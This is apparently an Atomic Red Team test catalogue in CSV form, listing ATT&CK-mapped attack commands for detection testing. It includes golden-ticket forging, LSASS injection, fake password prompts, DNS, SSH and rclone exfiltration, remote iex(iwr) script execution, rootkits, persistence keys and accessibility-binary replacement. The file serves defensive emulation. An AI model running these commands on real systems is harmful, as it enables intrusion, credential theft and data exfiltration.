T1526,Azure - Enumerate common cloud services,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""#{client_id}"" $client_secret = ""#{client_secret}"" $tenant_id = ""#{tenant_id}"" $environment = ""#{cloud}"" set-azureauthentication -clientid $client_id -clientsecret $client_secret -tenantid $tenant_id -environment $environment get-azurediscoverydata -outputdirectory ""#{output_directory}"" -environment $environment remove-blankfiles -outputdirectory ""#{output_directory}"""
T1649,Staging Local Certificates via Export-Certificate,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)"
T1566,Download Macro-Enabled Phishing Attachment,$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1566.001/bin/phishingattachment.xlsm' [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 invoke-webrequest -uri $url -outfile $env:temp\phishingattachment.xlsm
T1566,Word spawned a command shell and used an IP address in the command line,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n shell`$ `""ping 8.8.8.8`""`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1090,Psiphon,"& ""pathtoatomicsfolder\t1090.003\src\psiphon.bat"""
T1090,Tor Proxy Usage - Windows,"invoke-expression 'cmd /c start powershell -command {cmd /c ""#{torexe}""}' sleep -s 60 stop-process -name ""tor"" | out-null"
T1090,Tor Proxy Usage - Debian/Ubuntu/FreeBSD,"[ ""$(uname)"" = 'freebsd' ] && sysrc tor_enable=""yes"" && service tor start || sudo systemctl start tor"
T1090,Tor Proxy Usage - MacOS,"osascript -e 'tell application ""terminal"" to do script ""tor""'"
T1558,Crafting Active Directory golden tickets with mimikatz,"remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore # get current domain sid if default was used $domain_sid = ""#{domain_sid}"" if ($domain_sid -match ""default"") { # code from https://www.sevecek.com/englishpages/lists/posts/post.aspx?id=60 $domain = gwmi win32_computersystem | select -expand domain $krbtgtsid = (new-object security.principal.ntaccount $domain\krbtgt).translate([security.principal.securityidentifier]).value $domain_sid = $krbtgtsid.substring(0, $krbtgtsid.lastindexof('-')) } # create batch file with commands to run in a separate ""runas /netonly"" session # so we don't purge kerberos ticket from the current windows session # its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise @"" >%temp%\golden.txt 2>&1 ( echo purge existing tickets and create golden ticket: klist purge #{mimikatz_path} ""kerberos::golden /domain:#{domain} /sid:domain_sid /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt"" ""exit"" echo. echo requesting sysvol: dir \\#{domain}\sysvol echo. echo tickets after requesting sysvol: klist echo. echo end of golden ticket attack ) ""@ -replace ""domain_sid"", $domain_sid | out-file -encoding oem $env:temp\golden.bat # run batch file in a new empty session (password and username do not matter) echo ""foo"" | runas /netonly /user:fake ""$env:temp\golden.bat"" | out-null # wait until the output file has logged the entire attack do { start-sleep 1 # wait a bit so the output file has time to be created get-content -path ""$env:temp\golden.txt"" -wait | foreach-object { if ($_ -match 'end of golden ticket attack') { break } } } while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\golden.txt # cleanup temp files remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore"
T1558,Crafting Active Directory golden tickets with Rubeus,"remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore cmd.exe /c ""#{local_folder}\#{local_executable}"" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden $filename = (get-childitem | ? {$_.name.startswith(""golden_"")} | sort-object -descending -property lastwritetime | select -first 1).name # create batch file with commands to run in a separate ""runas /netonly"" session # so we don't purge kerberos ticket from the current windows session # its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise @"" >%temp%\golden.txt 2>&1 ( echo purge existing tickets and create golden ticket: klist purge cd %temp% ""#{local_folder}\#{local_executable}"" ptt /ticket:kirbifile echo. echo requesting sysvol: dir \\$(#{domaincontroller})\sysvol echo. echo tickets after requesting sysvol: klist echo. echo end of golden ticket attack ) ""@ -replace ""kirbifile"", $filename | out-file -encoding oem $env:temp\golden.bat # run batch file in a new empty session (password and username do not matter) echo ""foo"" | runas /netonly /user:fake ""$env:temp\golden.bat"" | out-null # wait until the output file has logged the entire attack do { start-sleep 1 # wait a bit so the output file has time to be created get-content -path ""$env:temp\golden.txt"" -wait | foreach-object { if ($_ -match 'end of golden ticket attack') { break } } } while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\golden.txt # cleanup temp files remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore"
T1014,Loadable Kernel Module based Rootkit,sudo insmod #{rootkit_path}/#{rootkit_name}.ko
T1014,Loadable Kernel Module based Rootkit,sudo modprobe #{rootkit_name}
T1014,dynamic-linker based rootkit (libprocesshider),"echo #{library_path} | tee -a /etc/ld.so.preload /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden"""
T1014,Loadable Kernel Module based Rootkit (Diamorphine),"sudo modprobe #{rootkit_name} ping -c 10 localhost >/dev/null & targetpid=""$!"" ps $targetpid kill -31 $targetpid ps $targetpid || echo ""process ${targetpid} hidden"""
T1566,Paste and run technique,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd /c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('#{execution_command}')) + ""{enter}"")"
T1574,Shared Library Injection via /etc/ld.so.preload,sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'
T1574,Shared Library Injection via LD_PRELOAD,ld_preload=#{path_to_shared_library} ls
T1574,Dylib Injection via DYLD_INSERT_LIBRARIES,dyld_insert_libraries=#{dylib_file} #{file_to_inject}
T1547,Winlogon Shell Key Persistence - PowerShell,"set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\"" ""shell"" ""explorer.exe, #{binary_to_execute}"" -force"
T1547,Winlogon Userinit Key Persistence - PowerShell,"set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\"" ""userinit"" ""userinit.exe, #{binary_to_execute}"" -force"
T1547,Winlogon Notify Key Logon Persistence - PowerShell,"new-item ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam"" -force set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam"" ""dllname"" ""#{binary_to_execute}"" -type expandstring -force set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam"" ""logon"" ""#{function_to_execute}"" -force set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam"" ""impersonate"" 1 -type dword -force set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam"" ""asynchronous"" 0 -type dword -force"
T1547,Winlogon HKLM Shell Key Persistence - PowerShell,"set-itemproperty ""hklm:\software\microsoft\windows nt\currentversion\winlogon\"" ""shell"" ""explorer.exe, #{binary_to_execute}"" -force"
T1547,Winlogon HKLM Userinit Key Persistence - PowerShell,"set-itemproperty ""hklm:\software\microsoft\windows nt\currentversion\winlogon\"" ""userinit"" ""userinit.exe, #{binary_to_execute}"" -force"
T1025,Identify Documents on USB and Removable Media via PowerShell,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1578,AWS - Create Snapshot from EBS Volume,"aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description ""atomic red team test snapshot"" --query ""snapshotid"" --output text"
T1578,Azure - Create Snapshot from Managed Disk,az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus
T1578,GCP - Create Snapshot from Persistent Disk,gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone}
T1580,AWS - EC2 Enumeration from Cloud Instance,"export aws_region=#{aws_region} cd #{stratus_path} echo ""stratus: start warmup."" ./stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" ./stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1580,AWS - EC2 Security Group Enumeration,aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format}
T1056,AppleScript - Prompt User for Password,"osascript -e 'tell app ""system preferences"" to activate' -e 'tell app ""system preferences"" to activate' -e 'tell app ""system preferences"" to display dialog ""software update requires that you type your password to apply changes."" & return & return default answer """" with icon 1 with hidden answer with title ""software update""'"
T1056,PowerShell - Prompt User for Password,"# creates gui to prompt for password. expect long pause before prompt is available. $cred = $host.ui.promptforcredential('windows security update', '',[environment]::username, [environment]::userdomainname) # using write-warning to allow message to show on console as echo and other similar commands are not visable from the invoke-atomictest framework. write-warning $cred.getnetworkcredential().password"
T1056,AppleScript - Spoofing a credential prompt using osascript,"pwd_spoof=$(osascript -e 'display dialog ""to perform a security update macos needs your passphrase."" with title ""macos security update"" default answer """" with icon stop with hidden answer') echo $pwd_spoof"
T1048,Exfiltration Over Alternative Protocol - SSH,"ssh #{domain} ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz"
T1048,Exfiltration Over Alternative Protocol - SSH,tar czpf - /users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /users.tar.gz.enc'
T1048,DNSExfiltration (doh),"import-module ""#{ps_module}"" invoke-dnsexfiltrator -i ""#{ps_module}"" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}"
T1048,Exfiltrate Data using DNS Queries via dig,"dig @#{attacker_dns_server} -p #{dns_port} $(echo ""#{secret_info}"" | base64).google.com"
T1033,System Owner/User Discovery,"cmd.exe /c whoami wmic useraccount get /all quser /server:""#{computer_name}"" quser qwinsta.exe /server:#{computer_name} qwinsta.exe for /f ""tokens=1,2"" %i in ('qwinsta /server:#{computer_name} ^| findstr ""active disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt @for /f %n in (computers.txt) do @for /f ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""active disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt"
T1033,System Owner/User Discovery,users w who
T1033,Find computers where user has session - Stealth mode (PowerView),[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); invoke-userhunter -stealth -verbose
T1033,User Discovery With Env Vars PowerShell Script,[system.environment]::username | out-file -filepath .\currentactiveuser.txt $env:username | out-file -filepath .\currentactiveuser.txt -append
T1033,GetCurrent User with PowerShell Script,[system.security.principal.windowsidentity]::getcurrent() | out-file -filepath .\currentuserobject.txt
T1033,System Discovery - SocGholish whoami,"$tokenset = @{ u = [char[]]'abcdefghijklmnopqrstuvwxyz' n = [char[]]'0123456789' } $upper = get-random -count 5 -inputobject $tokenset.u $number = get-random -count 5 -inputobject $tokenset.n $stringset = $upper + $number $rad = (get-random -count 5 -inputobject $stringset) -join '' $file = ""rad"" + $rad + "".tmp"" whoami.exe /all >> #{output_path}\$file"
T1033,System Owner/User Discovery Using Command Prompt,set file=#{output_file_path}\user_info_%random%.tmp echo username: %username% > %file% echo user domain: %userdomain% >> %file% net users >> %file% query user >> %file%
T1027,Binary simply packed by UPX (linux),cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
T1027,"Binary packed by UPX, with modified headers (linux)",cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
T1027,Binary simply packed by UPX,cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
T1027,"Binary packed by UPX, with modified headers",cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
T1055,Shellcode execution via VBA,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""#{txt_path}"" -officeproduct ""word"" -sub ""execute"""
T1055,Remote Process Injection in LSASS via mimikatz,"""#{psexec_path}"" /accepteula \\#{machine} -c #{mimikatz_path} ""lsadump::lsa /inject /id:500"" ""exit"""
T1055,Section View Injection,"$notepad = start-process notepad -passthru start-process ""$pathtoatomicsfolder\t1055\bin\x64\injectview.exe"""
T1055,Dirty Vanity process Injection,"start-process ""$pathtoatomicsfolder\t1055\bin\x64\redvanity.exe"" #{pid}"
T1055,Read-Write-Execute process Injection,"$address = (& ""$pathtoatomicsfolder\t1055\bin\x64\searchvuln.exe"" ""$pathtoatomicsfolder\t1055\bin\x64\vuln_dll\"" | out-string | select-string -pattern ""virtualaddress: (\w+)"").matches.groups[1].value & ""pathtoatomicsfolder\t1055\bin\x64\rwxinjectionlocal.exe"" ""#{vuln_dll}"" $address"
T1055,Process Injection with Go using UuidFromStringA WinAPI,$pathtoatomicsfolder\t1055\bin\x64\uuidfromstringa.exe -debug
T1055,Process Injection with Go using EtwpCreateEtwThread WinAPI,$pathtoatomicsfolder\t1055\bin\x64\etwpcreateetwthread.exe -debug
T1055,Remote Process Injection with Go using RtlCreateUserThread WinAPI,$process = start-process #{spawn_process_path} -passthru $pathtoatomicsfolder\t1055\bin\x64\rtlcreateuserthread.exe -pid $process.id -debug
T1055,Remote Process Injection with Go using CreateRemoteThread WinAPI,$process = start-process #{spawn_process_path} -passthru $pathtoatomicsfolder\t1055\bin\x64\createremotethread.exe -pid $process.id -debug
T1055,Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively),$process = start-process #{spawn_process_path} -passthru $pathtoatomicsfolder\t1055\bin\x64\createremotethreadnative.exe -pid $process.id -debug
T1055,Process Injection with Go using CreateThread WinAPI,$pathtoatomicsfolder\t1055\bin\x64\createthread.exe -debug
T1055,Process Injection with Go using CreateThread WinAPI (Natively),$pathtoatomicsfolder\t1055\bin\x64\createthreadnative.exe -debug
T1055,UUID custom process Injection,"start-process ""#{exe_binary}"" start-sleep -seconds 7 get-process -name notepad -erroraction silentlycontinue | stop-process -force"
T1548,Make and modify binary from C source,cp #{payload} /tmp/hello.c sudo chown root /tmp/hello.c sudo make /tmp/hello sudo chown root /tmp/hello sudo chmod u+s /tmp/hello /tmp/hello
T1548,Make and modify binary from C source (freebsd),cp #{payload} /tmp/hello.c chown root /tmp/hello.c make /tmp/hello chown root /tmp/hello chmod u+s /tmp/hello /tmp/hello
T1548,Set a SetUID flag on file,sudo touch #{file_to_setuid} sudo chown root #{file_to_setuid} sudo chmod u+xs #{file_to_setuid}
T1548,Set a SetUID flag on file (freebsd),touch #{file_to_setuid} chown root #{file_to_setuid} chmod u+xs #{file_to_setuid}
T1548,Set a SetGID flag on file,sudo touch #{file_to_setuid} sudo chown root #{file_to_setuid} sudo chmod g+xs #{file_to_setuid}
T1548,Set a SetGID flag on file (freebsd),touch #{file_to_setuid} chown root #{file_to_setuid} chmod g+xs #{file_to_setuid}
T1548,Make and modify capabilities of a binary,cp #{payload} /tmp/cap.c make /tmp/cap sudo setcap cap_setuid=ep /tmp/cap /tmp/cap
T1548,Provide the SetUID capability to a file,touch #{file_to_setcap} sudo setcap cap_setuid=ep #{file_to_setcap}
T1548,Do reconnaissance for files that have the setuid bit set,find /usr/bin -perm -4000
T1548,Do reconnaissance for files that have the setgid bit set,find /usr/bin -perm -2000
T1120,Win32_PnPEntity Hardware Inventory,"get-wmiobject win32_pnpentity | format-table name, description, manufacturer > $env:temp\t1120_collection.txt $space,$heading,$break,$data = get-content $env:temp\t1120_collection.txt @($heading; $break; $data |sort-object -unique) | ? {$_.trim() -ne """" } |set-content $env:temp\t1120_collection.txt"
T1120,WinPwn - printercheck,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') printercheck -noninteractive -consoleoutput
T1120,Peripheral Device Discovery via fsutil,fsutil fsinfo drives
T1120,Get Printer Device List via PowerShell Command,get-printer
T1491,Replace Desktop Wallpaper,"$url = ""#{url_of_wallpaper}"" $imglocation = ""#{wallpaper_location}"" $orgwallpaper = (get-itemproperty -path registry::'hkey_current_user\control panel\desktop\' -name wallpaper).wallpaper $orgwallpaper | out-file -filepath ""#{pointer_to_orginal_wallpaper}"" $updatewallpapercode = @' using system.runtime.interopservices; namespace win32{ public class wallpaper{ [dllimport(""user32.dll"", charset=charset.auto)] static extern int systemparametersinfo (int uaction , int uparam , string lpvparam , int fuwinini) ; public static void setwallpaper(string thepath){ systemparametersinfo(20,0,thepath,3); } } } '@ $wc = new-object system.net.webclient try{ $wc.downloadfile($url, $imglocation) add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } catch [system.net.webexception]{ write-host(""cannot download $url"") add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } finally{ $wc.dispose() }"
T1491,Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message,"$orglegalnoticecaption = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption).legalnoticecaption $orglegalnoticetext = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext).legalnoticetext $newlegalnoticecaption = ""#{legal_notice_caption}"" $newlegalnoticetext = ""#{legal_notice_text}"" set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption -value $newlegalnoticecaption -type string -force set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext -value $newlegalnoticetext -type string -force"
T1491,ESXi - Change Welcome Message on Direct Console User Interface (DCUI),"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""esxcli system welcomemsg set -m 'ransomware-notification'"""
T1491,Windows - Display a simulated ransom note via Notepad (non-destructive),"$notepath = join-path $env:temp ""#{note_filename}"" $pidpath = join-path $env:temp ""#{pid_filename}"" $title = ""#{note_title}"" $body = ""#{note_body}"" $header = $title + ""`r`n"" + ('=' * $title.length) + ""`r`n`r`n"" $content = $header + $body [system.io.file]::writealltext($notepath, $content, [system.text.encoding]::utf8) $p = start-process notepad.exe -argumentlist ""`""$notepath`"""" -passthru $p.id | out-file -filepath $pidpath -encoding ascii -force"
T1134,Named pipe client impersonation,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/bc-security/empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/get-system.ps1' -usebasicparsing); get-system -technique namedpipe -verbose
T1134,`SeDebugPrivilege` token duplication,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/bc-security/empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/get-system.ps1' -usebasicparsing); get-system -technique token -verbose
T1134,Launch NSudo Executable,"start-process ""#{nsudo_path}"" -argument ""-u:t -p:e cmd"" start-sleep -second 5 stop-process -name ""cmd"" -force -erroraction silentlycontinue"
T1134,Bad Potato,"cd ""pathtoatomicsfolder\..\externalpayloads"" start-process .\badpotato.exe notepad.exe start-sleep -second 20 stop-process -name ""notepad"" -force -erroraction silentlycontinue stop-process -name ""badpotato"" -force -erroraction silentlycontinue"
T1134,Juicy Potato,cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_clsid}'
T1012,Query Registry,"reg query ""hklm\software\microsoft\windows nt\currentversion\windows"" reg query hklm\software\microsoft\windows\currentversion\runservicesonce reg query hkcu\software\microsoft\windows\currentversion\runservicesonce reg query hklm\software\microsoft\windows\currentversion\runservices reg query hkcu\software\microsoft\windows\currentversion\runservices reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\notify"" reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\userinit"" reg query ""hkcu\software\microsoft\windows nt\currentversion\winlogon\\shell"" reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\\shell"" reg query hklm\software\microsoft\windows\currentversion\shellserviceobjectdelayload reg query hklm\software\microsoft\windows\currentversion\runonce reg query hklm\software\microsoft\windows\currentversion\runonceex reg query hklm\software\microsoft\windows\currentversion\run reg query hkcu\software\microsoft\windows\currentversion\run reg query hkcu\software\microsoft\windows\currentversion\runonce reg query hklm\software\microsoft\windows\currentversion\policies\explorer\run reg query hkcu\software\microsoft\windows\currentversion\policies\explorer\run reg query hklm\system\currentcontrolset\services /s | findstr imagepath 2>nul | findstr /ri "".*\.sys$"" reg query hklm\software\microsoft\windows\currentversion\run reg query hklm\system\currentcontrolset\control\safeboot reg query ""hklm\software\microsoft\active setup\installed components"" reg query ""hklm\software\microsoft\windows\currentversion\group policy\scripts\startup"""
T1012,Query Registry with Powershell cmdlets,"get-item -path ""hklm:software\microsoft\windows nt\currentversion\windows"" get-childitem -path ""hklm:software\microsoft\windows nt\currentversion\"" | findstr windows get-item -path ""hklm:software\microsoft\windows\currentversion\runservicesonce"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runservicesonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\runservices"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runservices"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\notify"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\userinit"" get-item -path ""hkcu:software\microsoft\windows nt\currentversion\winlogon\\shell"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\\shell"" get-item -path ""hklm:software\microsoft\windows\currentversion\shellserviceobjectdelayload"" get-item -path ""hklm:software\microsoft\windows\currentversion\runonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\runonceex"" get-item -path ""hklm:software\microsoft\windows\currentversion\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\policies\explorer\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\policies\explorer\run"" get-childitem -path ""hklm:system\currentcontrolset\services"" get-item -path ""hklm:software\microsoft\windows\currentversion\run"" get-item -path ""hklm:system\currentcontrolset\control\safeboot"" get-childitem -path ""hklm:software\microsoft\active setup\installed components"" get-childitem -path ""hklm:software\microsoft\windows\currentversion\group policy\scripts\startup"""
T1012,Enumerate COM Objects in Registry with Powershell,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file #{output_file} -append write-output $($clsid)| out-file #{output_file} -append $handle=[activator]::createinstance([type]::gettypefromclsid($clsid)) $handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append $position += 1} catch{}}"
T1012,Reg query for AlwaysInstallElevated status,reg query hkcu\software\policies\microsoft\windows\installer /v alwaysinstallelevated reg query hklm\software\policies\microsoft\windows\installer /v alwaysinstallelevated
T1012,Check Software Inventory Logging (SIL) status via Registry,reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
T1012,Inspect SystemStartOptions Value in Registry,reg.exe query hklm\system\currentcontrolset\control /v systemstartoptions
T1567,Exfiltrate data with rclone to cloud Storage - Mega (Windows),"new-item #{rclone_config_path}\rclone -itemtype directory new-item #{rclone_config_path}\rclone\rclone.conf cd ""#{rclone_path}"" .\rclone.exe config create #{remote_share} mega set-content #{rclone_config_path}\rclone\rclone.conf ""[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}"" .\rclone.exe copy --max-size 1700k ""#{dir_to_copy}"" #{remote_share}:test -v"
T1567,Exfiltrate data with rclone to cloud Storage - AWS S3,"write-host ""deploying aws infrastructure... "" -nonewline $awsaccesskey = ""#{aws_access_key}"" $awssecretkey = ""#{aws_secret_key}"" cd pathtoatomicsfolder/t1567.002/src/ if ($awsaccesskey -eq """" -or $awssecretkey -eq """") { $env:aws_profile = ""#{aws_profile}"" } else { $env:aws_access_key_id = ""$awsaccesskey"" $env:aws_secret_access_key = ""$awssecretkey"" } $null = pathtoatomicsfolder/../externalpayloads/t1567.002/terraform-v*/terraform init $null = pathtoatomicsfolder/../externalpayloads/t1567.002/terraform-v*/terraform apply -var ""aws_region=#{aws_region}"" -auto-approve write-host ""done!"" write-host ""generating rclone config... "" -nonewline $config = @"" [exfils3] type = s3 provider = aws env_auth = true region = #{aws_region} ""@ $config | out-file -filepath ""pathtoatomicsfolder/../externalpayloads/t1567.002/rclone.conf"" -encoding ascii write-host ""done!"" write-host ""exfiltrating data... "" -nonewline $bucket = ""$(pathtoatomicsfolder/../externalpayloads/t1567.002/terraform-v*/terraform output bucket)"".replace(""`"""","""") cd pathtoatomicsfolder/../externalpayloads/t1567.002/rclone-v* $null = ./rclone copy --max-size 1700k ""pathtoatomicsfolder/../externalpayloads/t1567.002/data/"" exfils3:$bucket --config ""pathtoatomicsfolder/../externalpayloads/t1567.002/rclone.conf"" write-host ""done!"""
T1614,Get geolocation info through IP-Lookup services using curl Windows,#{curl_path} -k #{ip_lookup_url}
T1614,"Get geolocation info through IP-Lookup services using curl freebsd, linux or macos",curl -k #{ip_lookup_url}
T1546,Attaches Command Prompt as a Debugger to a List of Target Processes,"$input_table = ""#{parent_list}"".split("","") $name = ""debugger"" $value = ""#{attached_process}"" foreach ($item in $input_table){ $item = $item.trim() $registrypath = ""hklm:\software\microsoft\windows nt\currentversion\image file execution options\$item"" if(!(test-path $registrypath)) { new-item -path $registrypath -force new-itemproperty -path $registrypath -name $name -value $value -propertytype string -force } else { new-itemproperty -path $registrypath -name $name -value $value } }"
T1546,Replace binary of sticky keys,if not exist c:\windows\system32\sethc_backup.exe (copy c:\windows\system32\sethc.exe c:\windows\system32\sethc_backup.exe) else ( pushd ) takeown /f c:\windows\system32\sethc.exe /a icacls c:\windows\system32\sethc.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
T1546,Create Symbolic Link From osk.exe to cmd.exe,if not exist %windir%\system32\osk.exe.bak (copy %windir%\system32\osk.exe %windir%\system32\osk.exe.bak) else ( pushd ) takeown /f %windir%\system32\osk.exe /a icacls %windir%\system32\osk.exe /grant administrators:f /t del %windir%\system32\osk.exe mklink %windir%\system32\osk.exe %windir%\system32\cmd.exe
T1546,Atbroker.exe (AT) Executes Arbitrary Command via Registry Key,"reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /v terminateondesktopswitch /t reg_dword /d 0 /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /v startexe /t reg_sz /d c:\windows\system32\cmd.exe /f atbroker /start malware_test"
T1546,Auto-start application on user logon,"reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /v terminateondesktopswitch /t reg_dword /d 0 /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /v startexe /t reg_sz /d c:\windows\system32\cmd.exe /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats"" /v configuration /t reg_sz /d malware_test /f"
T1546,Replace utilman.exe (Ease of Access Binary) with cmd.exe,if not exist c:\windows\system32\utilman_backup.exe (copy c:\windows\system32\utilman.exe c:\windows\system32\utilman_backup.exe) else ( pushd ) takeown /f c:\windows\system32\utilman.exe /a icacls c:\windows\system32\utilman.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe
T1546,Replace Magnify.exe (Magnifier binary) with cmd.exe,if not exist c:\windows\system32\magnify_backup.exe (copy c:\windows\system32\magnify.exe c:\windows\system32\magnify_backup.exe) else ( pushd ) takeown /f c:\windows\system32\magnify.exe /a icacls c:\windows\system32\magnify.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\magnify.exe
